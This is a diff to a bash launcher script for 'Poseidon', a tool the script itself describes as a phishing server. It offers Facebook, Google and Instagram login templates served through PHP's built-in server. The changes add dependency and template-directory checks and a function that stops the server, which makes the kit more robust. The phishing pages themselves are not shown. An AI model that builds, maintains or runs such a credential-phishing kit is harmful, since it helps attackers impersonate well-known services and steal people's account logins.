@@ -27,7 +27,15 @@ EOF
 
 # Function to check dependencies
 check_dependencies() {
-    command -v php >/dev/null 2>&1 || { echo >&2 "PHP is required but it's not installed. Aborting."; exit 1; }
+    command -v php >/dev/null 2>&1 || { echo >&2 "PHP is required but it's not installed. Please install PHP and try again."; exit 1; }
+}
+
+# Function to check required directories
+check_directories() {
+    if [ ! -d "templates" ]; then
+        echo -e "\nTemplates directory not found! Please make sure the templates directory exists."
+        exit 1
+    fi
 }
 
 # Function to start the phishing server
@@ -56,8 +64,15 @@ start_server() {
     fi
 }
 
+# Function to stop the server
+stop_server() {
+    pkill -f "php -S 127.0.0.1"
+    echo -e "\nServer stopped."
+}
+
 # Main script logic
 check_dependencies
+check_directories
 
 while true; do
     show_menu
@@ -67,7 +82,7 @@ while true; do
         1) template="facebook" ;;
         2) template="google" ;;
         3) template="instagram" ;;
-        0) echo -e "\nExiting Poseidon. Goodbye!\n"; exit 0 ;;
+        0) echo -e "\nExiting Poseidon. Goodbye!\n"; stop_server; exit 0 ;;
         *) echo -e "\nInvalid option! Please try again.\n"; continue ;;
     esac
 
